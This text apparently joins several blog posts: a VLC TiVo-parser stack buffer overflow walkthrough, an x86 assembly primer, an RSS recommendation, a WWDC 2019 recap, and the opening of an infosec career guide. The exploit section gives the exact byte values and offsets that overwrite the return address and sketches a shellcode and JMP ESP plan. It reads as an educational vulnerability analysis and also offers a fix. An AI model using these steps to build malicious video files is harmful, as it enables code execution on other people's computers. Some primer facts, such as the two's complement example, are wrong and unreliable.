The only validation of i_map_size is done via the if condition [11] which checks to see if it is greater than 8. What this doesn‚Äôt consider is whether i_map_size is some value 0 or smaller (even up to FFFFFFFFh!). Implementing more robust validation of i_map_size to ensure it can only be a value between 1 and 8 is one way to mitigate the vulnerability. So if we changed ‚Ä¶ if (i_map_size &gt; 8) {to‚Ä¶ if (i_map_size &lt; 1 || i_map_size &gt; 8) {then this could solve the issue!

Load this into IDA or an equivalent disassembler and you can peek into the assembly code as well. Starting with the source, we see two variables, mst_buf, declared as an array of 32 uint8_t (8-bit/1-byte unsigned) integers and i_map_size which is declared as a signed integer (32-bits). uint8_t mst_buf[32];int i, i_map_size;Further in, we see the first of two stream_Read function calls. This first call reads 32 bytes into the initialized mst_buf array. What‚Äôs important to note here, is this stream_Read takes data from a user-supplied source (namely, the chosen video file) and stuffs it into the buffer. stream_Read(p_demux-&gt;s, mst_buf, 32);Provided, is an example video file, video. ty+ (which is a short Tivo video file), which can be used as input. The parse_master function is called from the conditional displayed below (also located in same the ty. c file). Essentially, as VLC is processing the user input (video) file, if it encounters the 32-bit TIVO_PES_FILEID magic DWORD (which is 0xf5467abd) it will call parse_master with p_demux as the parameter. p_demux is the remaining bytes of the input file STARTING with the magic DWORD. Conditional which calls parse_master function when TIVO_PES_FILEID bytes are encountered. if( U32_AT( &amp;p_peek[ 0 ] ) == TIVO_PES_FILEID ) { /* parse master chunk */ parse_master(p_demux); return get_chunk_header(p_demux); }Definition of TIVO_PES_FILEID DWORD #define TIVO_PES_FILEID ( 0xf5467abd )Moving down, we see the variable i_map_size initialized as U32_AT(&amp;mst_buf[20]) which from the U32_AT inline function shown below will return a 4-byte integer (Endianness is Big-Endian) using the bytes starting at offset 20 of the mst_buf buffer. Given that we know mst_buf contains user-controlled data, we know now that i_map_size can be any arbitrary 4-byte integer. static inline uint32_t U32_AT( const void * _p ){ const uint8_t * p = (const uint8_t *)_p; return ( ((uint32_t)p[0] &lt;&lt; 24) | ((uint32_t)p[1] &lt;&lt; 16) | ((uint32_t)p[2] &lt;&lt; 8) | p[3] );}In the second stream_Read call (located in the for loop) we see that 8 + i_map_size bytes are read from the input buffer (the video file) into mst_buf. This should immediately throw the red flag as we know mst_buf is only 32 8-bit integers wide and i_map_size can be an arbitrarily large number (any signed 32-bit integer which can be as large as 2147483647/7FFFFFFFh) provided by the user. for (i=0; i&lt;p_sys-&gt;i_seq_table_size; i++) { stream_Read(p_demux-&gt;s, mst_buf, 8 + i_map_size);Using the provided video. ty+ file we can search (using a hex editor) for the magic bytes described earlier (f5 46 7a bd). One occurrence of this byte sequence is found at offset 0x00300000 in the video file. Moving to offset 20 (0x300014h in the file) from the start of the magic bytes we see a value of ‚Äú00 00 00 02‚Äù. This means (based on this particular video input file sample) that i_map_size will be set to a value of 2. Now that we see where we can affect the i_map_size variable and that the second stream_Read function can be used to overflow the mst_buf, let‚Äôs move to the disassembled code to get a better understanding of how many bytes are needed in order to overwrite the return address and take control of the instruction pointer. Analysis of Disassembly: Once you‚Äôve loaded libty_plugin. dll into IDA, you can search the available strings for the string ‚ÄúUnsupported SEQ bitmap size in master chunk‚Äù which we know resides in the parse_master function. msg_Err(p_demux, Unsupported SEQ bitmap size in master chunk );This string is referenced somewhere in the middle (offset 0x61401CF8) of the parse_master function in the disassembled code. . rdata:61409158 aUnsupportedSeq db 'Unsupported SEQ bitmap size in master chunk',0. rdata:61409158 ; DATA XREF: sub_61401AE0+218‚ÜëoOnce in the parse_master function we can identify the first stream_Read call (at offset 0x61401C1F) and analyze the arguments being set up for the function call (shown below). Of note, is the lea instruction which dereferences memory at [esp+0FCh+var_3C] into edx (which is then passed into stream_Read as the pointer to the mst_buf array buffer). When converted, 0FCh+var_3C is equal to C0h. With this information, we know that the mst_buf array exists on the stack at esp+C0h and goes to esp+E0h (since we know the array is 32/20h bytes wide). . . . . text:61401C05 mov ecx, 20h ;move 32 into ecx. text:61401C0A lea edx, [esp+0FCh+var_3C] ; pointer to mst_buf array at ESP+C0. text:61401C11 mov [esp+0FCh+var_F4], ecx ; 3rd param into stream_Read. text:61401C15 mov [esp+0FCh+var_F8], edx ; 2nd param into stream_Read. text:61401C19 mov edi, [eax+3Ch] ;pointer to p_demux input. text:61401C1C mov [esp+0FCh+Memory], edi ;input stream 1st param into stream_Read. text:61401C1F call stream_Read. . . Moving to the top of the function (at offset 0x61401AE0), we can examine the prologue (displayed below‚Ä¶) . text:61401AE0 push ebp. text:61401AE1 xor edx, edx. text:61401AE3 push edi. text:61401AE4 xor ebp, ebp. text:61401AE6 push esi. text:61401AE7 xor edi, edi. text:61401AE9 push ebx. text:61401AEA xor esi, esi. text:61401AEC sub esp, 0ECh. text:61401AEC sub esp, 0EChAs with any prologue, registers are being saved and room for local variables is being made on the stack. There are 4 pushes (registers being saved) and a sub instruction of ECh (room for local variables). Since we know mst_buf begins at esp+C0h and is 32 bytes in size we know that the end of this stack variable is at esp+E0h. Since ECh bytes were allocated for this function, we know that another 12 (Ch) bytes of stack space exist between the end of mst_buf and where EBX was pushed onto the stack. If you account for the 32 bytes of space taken by mst_buf on the stack, plus the 12 bytes of extra local variable space, plus the 4 saved registers (each 4 bytes wide) as well as the return address (4 bytes) which was put on the stack when parse_master was called, there are 64 total bytes that must be overwritten to overwrite the return address. A (crude) representation of the relevant stack items is shown below‚Ä¶ Stack Representation Bytes Data ‚Ä¶ ‚Ä¶lower memory addresses‚Ä¶ 32 Bytes esp+C0h through esp+E0h which we know is mst_buf 12 Bytes esp+E0h through esp+ECh which we know is the remaining local variable stack space 4 Bytes push ebx moves DWORD value of EBX onto stack 4 Bytes push esi moves DWORD value of ESI onto stack 4 Bytes push edi moves DWORD value of EDI onto stack 4 Bytes push ebp moves DWORD value of EBP onto stack 4 Bytes Return Address saved onto stack when parse_master function is called ‚Ä¶ ‚Ä¶higher memory addresses‚Ä¶ From this representation you can see that we need to write 64 (40h) bytes into mst_buf to overwrite the return address. Since we know from the source code that the second stream_Read reads in 8 + i_map_size bytes into mst_buf we know that we need to set i_map_size to 64 - 8 which is 38h. stream_Read(p_demux-&gt;s, mst_buf, 8 + i_map_size);Returning to our video. ty+ file - we can overwrite the byte offset we know corresponds to i_map_size with the byte values 00 00 00 38. Now, since the second stream_Read call occurs in a for loop, we want to ensure that it is only called once (so that additional data isn‚Äôt read into mst_buf). The for loop will execute i_seq_table_size amount of times and i_seq_table_size is set as i / (8 + i_map_size) which we can see from the source file. p_sys-&gt;i_seq_table_size = i / (8 + i_map_size);Since we have set i_map_size to 56(38h) we need to set i to a value which will result in i_seq_table_size being 1 (remember we want the for loop to only execute once). We can see from the source that i is set to the value U32_AT(&amp;mst_buf[28]). i = U32_AT(&amp;mst_buf[28]);So, moving 8 bytes further into the . ty+ file we can set the value that will ultimately be passed into i. From here, if we set mst_buf[28] equal to 40h (byte values 00 00 00 40) and mst_buf[20] byte values to 38h (00 00 00 38), we can have the for loop execute only once! Since 64 / (8 + 56) = 1. Moving on, if we move to the 64h/4 (16th) DWORD starting at offset 0x00300020 of the video. ty file (remember, the first stream_Read call read in 32 bytes starting at the magic DWORD so we must start the second stream_Read at this offset) we see the byte values 00 00 03 20. We now know from all our previous analysis that if we overwrite this value (and play this file in VLC), it will overwrite the return function on the stack and when the return instruction is called at the end of the parse_master function, it will return execution to that address which we now control! A graphic of the relevant bytes is provided below‚Ä¶ Code Execution: With control over execution, we can do the usual steps for arbitrary code execution. Namely, generate shellcode, add it to the input file so that it is written onto the stack immediately after we overwrite the original return return address (as part of the mst_buf overflow), then use a memory address pointing to a JMP ESP instruction residing in libty_plugin. dll (or elsewhere we can find a JMP ESP in memory) as our new return address which will result in our shellcode being jumped to once the parse_master function returns. Feel free to message me if something here wasn‚Äôt clear (I admit I am prone to writing confusingly long sentences) and thanks for reading!

Prerequisite Knowledge Intel Assembly Basics Registers Instructions Building an Instruction NASM Intro Tools and ResourcesBookmarks Calling Conventions Assorted Assembly Knowledge EFLAGS ModR/M Byte Format ModR/M Addressing Modes Opcode FlagsPrerequisite Knowledge: This section details a few fundamental concepts needed to get started with Intel assembly. Terminology: Understanding binary and hex as well as words like ‚Äúbit‚Äù, ‚Äúbyte‚Äú(8-bits) and ‚Äúnibble‚Äú(4-bits) are key to understanding anything further related to Intel assembly. Stack: The stack is a Last-In-First-Out (LIFO) data structure used for local variables, function parameters and assisting with program control flow. Learn more about the stack here. A stack structure supports two primary instructions push and pop. A push will place a value on the top of a stack while subtracting from the stack pointer, while a pop will remove a value off of the top of the stack (while adding to the stack pointer) and place the popped value in a storage location (such as a register). * The stack grows upward towards the lower memory range. * A pop increments the ESP register by 4 bytes and a push decrements the ESP register by 4 bytes. Heap: The heap is a managed memory region which allows for dynamic allocation of memory during runtime. The heap is typically used for objects too big to be placed on the stack. * The heap exists in the lower memory ranges and grows downward towards the stack. 1 and 2‚Äôs Complement: Essentially, the 1‚Äôs complement of a binary number is calculated by flipping each bit. For example, the 1‚Äôs complement of value ‚Äú0011‚Äù would be ‚Äú1100‚Äù. The 2‚Äôs complement of ‚Äú0011‚Äù is calculated by flipping each bit as performed previously (to ‚Äú1100‚Äù) and then adding a 1 to this value, thus getting a final value of ‚Äú1101‚Äù. As another example, If you have the number ‚Äú0000‚Äù and you take the 2‚Äôs complement, you will get ‚Äú1111‚Äù as the 1‚Äôs complement then add 1, thus getting ‚Äú10000‚Äù. As you can see, the 4-bit value is now a 5-bit value after the carry to the 5th bit. Additional Info If the top bit is set (i. e. 0x80000000) the value is negative. Given a 32-bit number our range is -31 bits all the way up to +31 bits (minus 1). Learn about 1 and 2‚Äôs complement here. Resources for performing binary/hex arithmetic and conversions are included in the Tools and Resources section. Intel Assembly Basics: Tools: Compiler is used to take high level source code (like C) and generate assembly code. Assembler takes assembly code and generates machine/object code. Linker takes multiple relocatable object codes and creates a single binary. Loader loads an executable at runtime. Disassembler reverses machine code back into assembly code. Word Size: A byte is the smallest, addressable size in the Intel architecture. (ex: 0xFF) A WORD (generically) is 2 consecutive bytes (ex:0xFFCC). (This stems from the days of 16-bit systems. ) In a 32-bit system a WORD can be considered 4 bytes (32 bits). Similarly, on a 64-bit system, a WORD would be 8 bytes. A DWORD and QWORD are 4 consecutive bytes and 8 consecutive bytes respectively. Syntax: Intel Syntax - The first operand is the destination and second operand is the source. (ex: mov edx, ecx). This syntax is far more prevalent. AT&amp;T Syntax - First operand is the source operand and second operand is the destination. (ex: movl %ecx, %edx). Very recognizable by the ampersands among other differences. Endian-ness: Endianness refers to the order of bytes (usually in memory) of a binary number. Consider a series of memory addresses 0x00, 0x01, 0x02 and 0x03 and consider a hex integer 0x41424344. To store this integer in the given memory addresses in a Little Endian format, it would be stored with the low-order bytes first - 0x44, 0x43, 0x42, 0x41 respectively in addresses 0x00, 0x01, 0x02 and 0x03. Big Endian would store the integer with the higher-order bytes first 0x41, 0x42, 0x43, 0x44 respectively in addresses 0x00, 0x01, 0x02 and 0x03. Endianness comes into play when there are 2 or more consecutive bytes. Big Endian is also known as ‚ÄúNetwork Byte Order‚Äù. (TCP sends data in Big Endian format) No concept of endianness exists when it comes to values stored in a register. Prologue/Epilogue/Stack Frame: The stack frame is set up via the function prologue. (Example shown below) push ebpmov ebp, espsub esp, NThe stack frame pushes the current base pointer onto the stack (via push ebp) then stores the stack pointer into EBP at the start of a function call. This is done so that local variables and arguments of that function can be referenced relative to EBP throughout the execution of the function. Local variables are referenced above (-)EBP while arguments are referenced below (+)EBP. The stack frame is destroyed via the function epilogue. mov esp, ebppop ebpretCalling Conventions: * A call instruction pushes a return address onto the top of the stack and jumps to the memory address referenced in the call instruction (by setting EIP to the call destination). The return address is the address of the call instruction plus 4 bytes (essentially the next instruction after the call). * ret/retn (return) instruction (essentially) pops the top of the stack (the return address) into EIP and directs execution flow to it. * retn [int] goes a step further and increments ESP [int] bytes in order to clean up any stack parameters used during the respective function call. stdcallWith this convention, arguments of a function are pushed in reverse order then the called function (callee) is responsible for cleaning up the stack after. In this convention, the retn [int] return instruction is used. cdeclWith a cdecl call, the calling function is responsible for cleaning up the stack. This is typically done by using an add esp, int statement after the function has returned. (shown below) The cdecl advantage is that it allows for a variable amount of arguments to a function. function: push ebp pop ebp retnpush 10101010hcall functionadd esp, 4fastcallThis convention stores arguments in registers (x86 stores first two in ecx, edx and the rest on the stack, x64 stores first four in rcx, rdx, r8 and r9) since registers are faster than storing on the stack (memory). The callee then cleans the stack in x86 (similar to stdcall) and in x64 the caller cleans the stack (similar to cdecl). Assorted Assembly Knowledge: EAX generally contains the return value for function calls. Some x86 instructions need to work with 64-bit operations, in these cases, EDX:EAX is typically used. In an IDIV instruction a 64-bit value, EDX:EAX is divided by ECX. The quotient is stored in EAX and the remainder is stored in EDX. Jumps can be used as evidence of signed vs unsigned operations. ja, jae, jb and jbe are related to unsigned operations while jl, jle, jg and jge are related to signed operations. Registers: Registers are located on the CPU and are extremely fast to access. EIP - The Extended Instruction Pointer (EIP) or program counter is a reserved register that contains pointer to the memory location of the currently executing instruction. 32-bit arch does not allow direct access to this register.

The low-order 16-bits of every general purpose register can be accessed by removing the ‚Äúe‚Äù from the register name (e. g. , ax, cx, dx, bx, sp, bp, si, di). Only eax, ecx, ebx and edx can reference high/low 8-bits (e. g. , ah/al, ch/cl, bh/bl, dh/dl respectively). Segment Registers: CS - Code Segment Register - Maintains the Ring Level (0-3) in the Current Privilege Level (CPL) field. DS - Data Segment Register SS - Stack Segment Register ES - Extra Data Segment Register. GS - Extra Segment RegisterOther Registers: EFLAGS: EFLAGS register is used to store status and execution states. ZF/Zero flag - Set if previous arithmetic op is zero, otherwise it is cleared. SF/Sign flag - Set when result of an op is negative and cleared when positive. Also set when most significant bit is set after an arithmetic op. CF/Carry flag - Set when result of an op requires a carry (applies to unsigned numbers) because result is too large/small for destination. OF/Overflow flag - Set if result overflows max size (applies to signed numbers). TF/Trap flag - Used for debugging. x86 will execute only one instruction at a time if this flag is set. Control Registers: CR0 - Controls whether paging is on or off. Bit 0 - Protected Mode Enabled Bit 16 - Write-Protect (when set, CPU cannot write to read-only memory even in Ring 0) Bit 31 - Enable Paging (allows CR3 to be used) CR2 - Contains the linear address that caused a page fault. CR3 - Contains physical base address of Physical Directory Base Register (PDBR). Used when virtual addressing is enabled. CR4 - Controls hardware virtualization settings. Bit 5 - Physical Address Extensions (PAE) (extends 32-bit addressing to 36-bit) Bit 20 - SMEP (Supervisor Mode Execution Prevention) which disallows Ring 0 from executing user mode memory. Bit 21 - SMAP (Supervisor Mode Access Protection) disallows Ring 0 from accessing user mode memory. Debug Registers: DR0 - DR3 - Contains linear address of memory location to be watched DR4, DR5 - Aliases for DR6 and DR7 DR6 - Debug status register which contains type of last exception occurred (execution/access/write). These bits must be cleared by debugger, not processor. DR7 - Debug control registerInstructions: The Intel x86 ISA supports a wide variety of instructions. Detailed information on these instructions can be viewed via the Intel 64 and IA-32 Architectures Software Developer Manuals. Intel instructions have a variable length format, the general machine format is shown below. The parts of an instruction are further explained here. PREFIX | OPCODE | MODR/M | SIB | DISPLACEMENT | IMMEDIATE *Steps on how to code assembly instructions into their machine counterparts can be found here. Additional Info Instruction operands can be a register, an immediate (constant value) or a memory address. A Label is an optional identifier followed by a colon. A Mnemnoic is a reserved name for the human-readable form of a machine instruction. (ex: opcode 0x03 is add). Assembly instructions have the human-readable format: label: mnemonic operand1, operand2, operand3 Dereferencing memory is done in assembly using bracket [ ebx ] notation. This means memory is being accessed. In other words, when memory is dereferenced, you are reading/writing the value that is stored at a memory address rather than the memory address itself. Instruction Classes: Simple - The mov instruction is a simple and oft-used instruction which moves data from one place to another. Arithmetic - A multitude of arithmetic operations exist for addition, subtraction, etc‚Ä¶ (ex: add, sub, inc, dec, mul, div, etc‚Ä¶). NOP - The nop instruction does nothing, execution simply continues to the next line. (fun fact: a NOP is really a xchg eax, eax. ) Stack - This includes instructions for moving data to and from the stack like push and pop. Function - This includes instructions for calling and returning from functions (ex: call, ret, retn, etc‚Ä¶) Conditionals - These instructions are for making comparisons. (ex: test, cmp, etc‚Ä¶) Branching - Consisting of conditional and unconditional jumps, these instructions control flow of the program. (ex: jz, jnz, je, jg, and many many more‚Ä¶). Rep - Instructions for manipulating data buffers. (ex: rep, repz, repne, etc‚Ä¶) *This list of instructions is far from exhaustive. Reference the Intel manual for a complete list. Instruction Anatomy: PrefixMore details to follow‚Ä¶ Opcode1-3 byte value representing the machine code value for an instruction. ModR/M1 byte value which follows the opcode and identifies the addressing mode as well as the register/memory operands. Only some instructions require this byte. Instructions which require this byte will have the ‚ÄúModRM‚Äù label in it‚Äôs respective Instruction Operand Encoding table.

(ex: mov dword [ecx + 0xAABBCCDD], 0x11223344) Immediate8, 16, or 32-bit value that is a literal number. (ex: 0xAABBCCDD in the instruction mov eax, 0xAABBCCDD) Building an Instruction: The table below describes the various MODR/M addressing modes which are needed to build many types of instructions. MODR/M Addressing Modes: MOD¬†¬† Assembly¬†¬† Explanation 00 [r/m] r/m32 operand memory address is located in the r/m register 00 [disp32] if MOD is 00 AND R/M is 101 this indicated r/m32 location is a memory location that is a displacement32 only 01 [r/m32 + byte] r/m32 operand memory address is located in the r/m register + a 1-byte displacement 10 [r/m + dword] r/m32 operand memory address is in the r/m register + a 4-byte displacement 11 r/m r/m32 operand is a direct register access Example 1: Take for example the instruction add eax, ebx Find the ADD instruction in Intel manual (shown above. ) Find in the Instruction column an instruction which takes two r/m32 operands. In this case, the opcodes which match this description are ‚Äú01 /r‚Äù and ‚Äú03 /r‚Äù. Checking the Instruction Operand Encoding table we can match the Op/En for each of the opcodes found above with the entry in the table. For example, the 01 /r opcode has an Op/En of MR which based on the Operand Encoding Table would make Operand 1 the r/m and Operand 2 the reg. Since from the Operand Encoding table we can see ModRM in the MR row we know that a MODR/M byte is required for this instruction. From the MODR/M addressing mode table we can see that since the r/m32 operand is a direct register, the value for the first two bits of the MODR/M byte is 11. Since ‚Äú01 /r‚Äù is ADD r/m32, r32 we know that the next three bits of the MODR/M byte is the reg which in this case is the second operand of the instruction ‚Äúebx‚Äù which is encoded as 011. The final three bits is the instruction ‚Äúeax‚Äù which is encoded as ‚Äú000‚Äù. (These encodings are found in the General Purpose Registers table) Putting it all together we have an opcode of 0x01 plus 11011000b which translates to 0x01 0xD8 which when disassembled translates to add eax, ebx!Additional Info r/m32 means you can use a register or memory. r32 means you can only use a register. An Intel instruction is of variable length and can be up to 15 bytes (120 bits). Opcode Flags: NP ‚Äî Indicates the use of 66/F2/F3 prefixes (beyond those already part of the instructions opcode) are not allowed with the instruction. Such use will either cause an invalid-opcode exception (#UD) or result in the encoding for a different instruction. /digit ‚Äî A digit between 0 and 7 indicates that the REG field (2nd field) of the ModR/M byte contains the 3-bit value (0-7) which provides an extension to the instruction‚Äôs opcode. /r ‚Äî Indicates that the REG field (2nd field) of the ModR/M byte contains the 3-bit r32 operand value. cb, cw, cd, cp, co, ct ‚Äî A 1-byte (cb), 2-byte (cw), 4-byte (cd), 6-byte (cp), 8-byte (co) or 10-byte (ct) value following the opcode. This value is used to specify a code offset and possibly a new value for the code segment register. ib, iw, id, io ‚Äî A 1-byte (ib), 2-byte (iw), 4-byte (id) or 8-byte (io) immediate operand to the instruction that follows the opcode, ModR/M bytes or scale-indexing bytes. The opcode determines if the operand is a signed value. All WORDs, DWORDs and QWORDs are given with the low-order byte first. +rb, +rw, +rd, +ro ‚Äî Indicated the lower 3 bits of the opcode byte is used to encode the register operand without a modR/M byte. The instruction lists the corresponding hexadecimal value of the opcode byte with low 3 bits as 000b. In non-64-bit mode, a register code, from 0 through 7, is added to the hexadecimal value of the opcode byte. In 64-bit mode, indicates the four bit field of REX. b and opcode[2:0] field encodes the register operand of the instruction. ‚Äú+ro‚Äù is applicable only in 64-bit mode.

Do you like to save time? Do you like things that are free? If you said yes to these questions than RSS might be for you! Intro: I am a huge fan of RSS (Rich Site Summary) and have been using it for a long time (since the heyday of Google Reader). Using RSS + an aggregator allows you to pull new content from your favorite places around the web all into a single spot, as soon as this content is available. Rather than manually going to a bunch of different sites to see if there are any new posts, you can have those posts brought to you, all in one place, sorted by site, category, chronologically, you name it! So how do you get started viewing all your content via RSS feeds? This is where an RSS client comes in. RSS clients take site feeds and present them to you as a simple list of items where each item is typically made up of the article source, article title, a few of the first lines of the article (or article description) and a relative/absolute date stamp (this is illustrated in the image below). This makes it very simple to quickly scroll through all of your posts, new and old. If you see one that is interesting, you can click on it to read more or you can save it for later-reading. If nothing in the feed looks interesting to you after you‚Äôve scrolled through everything, you can mark-all-as-read and be on your way! This makes keeping up with even a large amount of blogs (assuming they aren‚Äôt particularly high-volume) a breeze. In fact, I‚Äôd say over 90% of the stuff that goes into my feed day-after-day are not things I would read the entire article of. But in this way, I can quickly find what is interesting to me and save it or I can get quick bites of information by simply reading the article titles. My Surprise: Even in it‚Äôs ‚Äúprime‚Äù, the use of RSS + an RSS aggregator was probably never what one would consider mainstream. With this said, I was surprised to find that even many of my technologically-savvy and frequent-news-reading family/friends/colleagues do not use an RSS aggregator. Rather, their news consumption was based mostly on things like Twitter, Google News, or‚Ä¶ save me‚Ä¶ LinkedIn or Facebook. Don‚Äôt get me wrong, I like Twitter and it definitely has a place in my news-collecting workflow but it has many problems in this respect. One problem with using Twitter for news aggregation is that Twitter is not a news platform, it is a social networking platform. Sure, people post ‚Äúnews‚Äù, and they post links to articles from around the web and in this way it can sometimes function like a news aggregator but I have found that in too many cases the personalities I follow (even when carefully curated) can tend to post things that have no place in a news/blog feed (e. g. rants, off-topic items, random pictures, etc‚Ä¶)! Further, Twitter is no replacement for RSS because there is no guarantee that all the blogs/sites you like to read even have a Twitter account. Or let‚Äôs assume the sites you like DID have a Twitter account and posted links to new articles to Twitter, there is no guarantee that they won‚Äôt go off and post a bunch of non-article related stuff to that Twitter account as well, resulting in a lower fidelity news/article stream. Similarly, social media sites like Facebook and LinkedIn are no replacements for RSS for the same reason Twitter isn‚Äôt. How to RSS: First things first, let‚Äôs get an RSS aggregation service/engine. My RSS aggregation service of choice is Feedly (now that Google Reader is dead). There are other alternatives as well and having not tried any of them, I can‚Äôt really say if one is better than the other but Feedly is just the one I landed on after Google Reader‚Äôs demise. Creating a Feedly account is free and you can sign up with a login through a number of different services (Google, Facebook, Twitter, Windows Live, Evernote, etc‚Ä¶) I‚Äôll also mention that I am a subscriber to Feedly‚Äôs Pro Service. Though they have a perfectly good Free Tier, I like to use Pro as it gives me additional functionality (e. g. more sources, powerful search and much more) and it‚Äôs also just a nice way to support a service that I really enjoy (so it doesn‚Äôt suffer the same fate as Google Reader). Feedly Pro also has additional tiers (i. e. Pro+, Business, Enterprise) with even more functionality. Feedly has also recently debuted a new feature called ‚ÄúFeedly for Cybersecurity‚Äù which is essentially an Open-Source threat intelligence feed. Though I haven‚Äôt tried it myself, this seems like a cool option for those in the market for threat intel! Once you are signed up and logged in, you can hit the ‚Äú+ ADD CONTENT‚Äù area on the bottom left of the Feedly web-interface and search for sources you are interested in. Feedly does a good job of finding any applicable RSS feeds for the sites you punch in. For those who want extended functionality, Feedly even goes further than RSS - supporting feeds on curated topics and even Google Keyword alerts. Feedly also does a great job at suggesting ‚Äúsimilar content‚Äù, which allows you to easily expand the sources you follow. Now when you come across interesting sites in the future you can remember to add them here to stay up to date on any new content! If you‚Äôd like to take your news consumption on the go (as I do), there are native mobile apps for RSS such as Feedly‚Äôs own Feedly app for the iOS ecosystem or if you‚Äôre more of a Googly person, Feedly has you covered there too. I personally like the iOS app Reeder (featured in the screenshot from above). For those who are interested in the (infosec-specific) feeds I follow, check them out here. Alternatively, you can directly download the exported . opml file with all the feeds I follow! Outro: From the biggest of online news/article-reading junkies to the most casual of digital-wanderers - I think everyone could benefit from leveraging RSS to consume their digital feeds. Agree?

Announcements: Services: Apple Arcade | No updates (available this fall) Apple Card | No updates (available this summer) Apple TV+ | No updates except an introduction to the new Ron Moore tv show ‚ÄúFor All Man Kind‚ÄùtvOS: Multi-User Support (switchable via Apple TV control center) Lyrics for Apple Music Xbox One S and Playstation DualShock 4 controller support* Partnered with BBC Natural History Unit for new screensaverswatchOS 6: Several new watch faces Taptic Chimes which give you a taptic or audible chime on the hour Introduction of calculator (with tip calculation!), audiobooks and voice memos apps Watch-independent apps (do not need companion iPhone app) Some new APIs (e. g. runtime, streaming audio, etc. . ) Native App Store on Apple Watch Activity Trends with 9 key metrics and new Summary view Noise app which intermittently checks if decibel levels are too high Menstrual Cycle TrackingiOS 13: Faster FaceID 50% smaller firmware updates and 60% smaller app udpates 2x faster launch speed Dark mode* Native Swype-style keyboard functionality ‚ÄúQuick Path‚Äù Sharing suggestions in control center Time-synced lyrics in the Music app Assorted updates to Safari, Mail and Notes Reinvented Reminders app Updated Maps app (available in US by end of 2019) ‚ÄúLookaround‚Äù in Maps which is their version of Google Street View New Privacy Stuff Allow-just-once location access granting Background location tracking alerts Wi-Fi &amp; Bluetooth Protections Sign in with Apple (single sign-on similar to those offered by Facebook and Google) HomeKit Secure Video 10-days of recording comes free and doesn‚Äôt count against iCloud storage HomeKit-enabled routers (Linksys, Eero, Spectrum are some manufacturers that will have compatible routers at launch) Memoji updates with accessories and makeup Memoji Stickers New photo and video editing as well as portrait effects Video rotation as an edit feature* Machine learning for showing best photos in Photos app Music Sharing via AirDrop Live Radio in Music app (100,000+ radio stations) Updated Shortcuts app Improved text-to-speech for Siri (sounds more natural) Menstrual Cycle Tracking in Health app Low Data Mode Single Sign-On (SSO) for enterprise Separate iCloud accounts for Work/Personal Send spam callers directly to voicemailiPadOS: Newly introduced iPadOS* Tighter grid of icons on home screen Pin widgets directly to home screen Drag up or slide on bottom in Slide Over to switch to recently opened Slide Over apps Multiple of the same app open at once App Expose Column View &amp; Quick Actions in Files app Folder sharing in iCloud Drive SMB file sharing support External Storage Support with direct import capability* Desktop-class browsing in Safari* Download manager for Safari Custom fonts Improved cursor, text-selection and other text-related gestures Three-finger swipe-back for undo (an alternative to shake-to-undo) Apple Pencil latency improvements (20 ms to 9 ms) PencilKit API Improved Markup capabilities Compact (pinchable) keyboard layoutMac Pro: New Mac Pro announced* (up to) 28-core Intel Xeon processor (up to) 1. 5 TB of system memory Supports (up to) 6 Pro Display XDRs at once Starts at $6k and available in the Fall Full specs can be found on the Mac Pro product page via Apple. comPro Display XDR 32-inch Retina 6K LCD display (20 million pixels) - sold separately Supports portrait mode rotation Starts at $5k (wow thats pricy) Full specs can be found on the Pro Display XDR via Apple. commacOS Catalina: New Music app (now separated from iTunes) New device sync options embedded directly in Finder (as opposed to being in iTunes) New Podcasts app (separated from iTunes) New Apple TV app ‚ÄúSidecar‚Äù capability to use iPad as second display for Mac Voice Control which provides full control-by-voice for Mac as well as iPhone and iPad (great accessibility feature) ‚ÄúFind My‚Äù app which combines Find Friends and Find My iPhone Activation Lock for Mac Updated Photos, Safari, Notes and Reminders apps Screen Time for Mac ‚ÄúProject Catalyst‚Äù (formerly Marzipan) which helps developers quickly create Mac apps based on existing iPad apps* SwiftUIOther: New watch bands including a ‚ÄúPride‚Äù band Handoff for AirPod Speaker-aware responses with HomePodThere is of course much more not explicitly announced on stage for each of these products‚Ä¶ Thoughts: I‚Äôm excited about what the added Xbox and PlayStation controller support may mean for the upcoming Apple Arcade service. Hopefully this means more console-level gaming is coming. I don‚Äôt like the look of Apple‚Äôs iOS Dark Mode. It is more of a Black mode. This may have some benefits related to OLED screens and of course this is a subjective feeling but I hope they come out with a more traditional ‚Äúdark‚Äù or maybe ‚Äúspace-grey‚Äù mode. The ability to edit videos from portrait to landscape is something I have wanted forever. I‚Äôm curious to see how this works exactly. The new OS for iPad (iPadOS) seems very promising. However without a native command line, Xcode or virtualization capabilities, it is still far from a Mac replacement for me. Though it wasn‚Äôt announced on stage, iPadOS does now include mouse support which gets it one step closer! External storage support over USB-C was a much requested feature and I‚Äôm happy they added it in iPadOS. Apple announced ‚Äúdesktop class browsing‚Äù for mobile Safari on the iPad. This is misleading as all they mean by this is that sites will not render the mobile version on the iPad, rather they will render the full desktop version. Using the term ‚Äúdesktop class browsing‚Äù may lead you to think their browser is a full desktop browser (similar to Chrome on a chromebook) etc‚Ä¶ With this said, this small change does allow the iPad to work properly with a number of sites that were previously broken or unusable (e. g. Google Docs, WordPress, etc‚Ä¶) I‚Äôm no hardware expert nor have I ever owned a Mac Pro but the new Mac Pro offering certainly looks ridiculously impressive. At a 6k starting price plus the 5k pro display (sold separately), this is certainly out of range for any normal consumer. But hey, that‚Äôs why its a PRO device! There was a pretty hilarious bit by Craig Federighi as he showed off mail and other apps embedded in iTunes (as a joke) right before he explains how iTunes functionality has in-fact now been pulled apart into several different apps. RIP iTunes: 2001-2019 Catalyst (formerly known as Marzipan) should bring a lot of awesome capabilities to the Mac by way of iPad apps. The iPad has a rich ecosystem of apps and many that I would love to see on the Mac. Overall, a pretty solid showing by Apple. I‚Äôm excited to try it all out in the near future! (with the exception of the Mac Pro as it‚Äôs definitely out of the price and power range for me personally).

Given the steady frequency in which I have observed this same question, I decided to catalog my oft-repeated bits of advice and general thoughts about how to get started. This guide is by no means an exhaustive how-to, nor does it represent the best or clearest path to a successful career in infosec. I only hope it can act as a compass for those who are interested in breaking into the field. Jump to Section: Primary Advice Auxiliary Advice Information Security Domains Resources Podcasts Communities 10-Step PlaybookPrimary Advice: What do you want to do? There is a wide variety of infosec-related trades, and though the path into any one of these roles may share some commonalities, there is no one-size-fits-all approach to becoming a cybersecurity professional. For this reason, the first thing I ask is - Do you have an idea of what role specifically you‚Äôd like to pursue? If you‚Äôre not sure, don‚Äôt worry! This is common for those new to the field. A little research into possible positions and titles is easy enough. To do so, I recommend perusing employment sites such as Monster, LinkedIn, SimplyHired, CareerBuilder or simply Googling what you are interested in. Within these job listings you should find not only the titles of potential jobs but also the sought-after skills and 